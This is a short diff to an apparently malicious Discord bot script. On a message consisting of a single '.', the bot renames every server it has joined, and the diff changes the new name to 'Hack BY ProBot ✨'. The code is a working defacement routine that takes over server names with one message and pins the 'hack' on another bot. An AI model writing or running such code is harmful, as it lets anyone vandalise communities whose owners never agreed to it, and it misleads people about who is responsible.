@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName('DAPERT BA GAN CHW')
+             m.setName('Hack BY ProBot ✨')
 })
 }
 });
